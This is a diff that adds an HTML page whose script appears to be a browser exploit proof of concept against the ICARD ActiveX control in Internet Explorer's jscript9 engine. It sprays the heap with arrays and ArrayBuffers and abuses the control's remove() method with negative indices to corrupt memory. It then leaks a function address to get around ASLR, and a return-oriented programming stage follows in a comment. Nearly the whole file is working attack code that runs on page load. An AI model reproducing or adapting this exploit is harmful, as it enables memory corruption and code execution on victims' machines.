@@ -1,0 +1,118 @@
+<html>
+    <body>
+        <object classid='clsid:19916E01-B44E-4E31-94A4-4696DF46157B' id='ICARD'></object>
+        <script>
+
+            function sleep(d){
+                for(var t = Date.now();Date.now() - t <= d;);
+            }
+ 
+            function create_object(i){   
+                var obj = document.createElement("object");   
+                obj.classid = 'clsid:19916E01-B44E-4E31-94A4-4696DF46157B';   
+                obj.id = 'I'+i;
+                document.body.appendChild(obj); 
+                return  document['I'+i].RequiredClaims; 
+            }
+
+            function add_item(obj_icard, str, size){
+                for(var i = 0; i < size; i++)
+                    obj_icard.add(str+i);
+            }
+
+            function remove_item(obj_icard, size){
+                for(var i = 0; i < size; i++)
+                     obj_icard.remove(0);
+            }
+
+            function getFiller(n) {
+                 return new Array(n+1).join("a");
+            }
+
+            function getDwordStr(val) {
+                return String.fromCharCode(val % 0x10000, val / 0x10000);
+            }
+
+
+    alert("jscript9");
+    a = new Array();
+
+    for (i = 0; i < 0x200; ++i) {
+      a[i] = new Array(0x3c00);
+      if (i == 0x80)
+        buf = new ArrayBuffer(0x58);      // 必须恰好是0x58!
+
+      for (j = 0; j < a[i].length; ++j)
+        a[i][j] = 0x123;
+    }
+       for (; i < 0x200 + 0x400; ++i) {
+          a[i] = new Array(0x3bf8)
+        for (j = 0; j < 0x55; ++j)
+            a[i][j] = new Int32Array(buf)
+    }
+
+            rc_obj0 = create_object(0);
+            rc_obj1 = create_object(1);
+            rc_obj2 = create_object(2);
+          
+            rc_obj3 = create_object(3);
+            rc_obj4 = create_object(4);
+            rc_obj5 = create_object(5);
+
+            add_item(rc_obj0,"A",20);
+            add_item(rc_obj1,"B",20);
+            add_item(rc_obj2,"C",20);
+
+          //  alert("create document");
+
+            // var table = document.createElement('table');
+            // a = document.body.appendChild(table);
+            var table = document.createElement('div');
+            table.className =  getDwordStr(0x0c0af000) + new Array((0x50-4)/2).join("a");//getDwordStr(document.createElement("div"))+getFiller(46/2-1);   //  
+            //table.className[0] = document.createElement("table");
+
+  
+          //  alert("add_item");
+            add_item(rc_obj3,"D",20);
+            add_item(rc_obj4,"E",20);
+            add_item(rc_obj5,"F",20);
+
+           // alert("end_add,start remove");
+            remove_item(rc_obj0,20);
+            remove_item(rc_obj1,20);
+            remove_item(rc_obj5,20);
+
+            rc_obj5.remove(0);
+            rc_obj5.remove(-88);
+            rc_obj5.remove(-88);
+            
+            for(var i=0; i< 20;i++)
+                rc_obj5.remove(-110);
+
+            var function_addr = rc_obj2.item(0).charCodeAt(1)*65536+rc_obj2.item(0).charCodeAt(0);  
+            alert('0x'+(function_addr-0x00116b24).toString(16)); 
+
+          
+            /*ROP code
+            alert("ROP");
+            remove_item(rc_obj3,20);
+
+            add_item(rc_obj3,"AAAABBBBCCCC",20);
+
+            rc_obj5.remove(-108);
+
+            rc_obj5.remove(-108);   
+            
+            for(var i=0;i<20;i++)   
+                rc_obj5.remove(-132);
+
+            alert("Done");
+
+            table.classid = 'AAAA';
+            alert(table.classid);
+            */
+
+
+        </script>
+    </body>
+</html>
